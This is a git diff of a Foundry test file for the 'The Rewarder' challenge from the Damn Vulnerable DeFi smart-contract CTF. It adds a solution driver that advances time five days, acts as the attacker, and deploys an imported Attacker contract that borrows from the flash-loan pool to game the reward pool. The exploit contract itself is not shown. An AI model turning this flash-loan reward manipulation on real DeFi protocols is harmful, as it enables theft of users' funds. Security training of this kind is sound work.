@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
+import {Attacker} from "../../../src/Contracts/the-rewarder/attack.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
@@ -89,7 +90,19 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.warp(block.timestamp + 5 days);
 
+        RewardToken rew = theRewarderPool.rewardToken();
+
+        vm.startPrank(attacker);
+        Attacker Att = new Attacker(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt),
+            address(rew)
+        );
+        Att.attackFlashloan();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
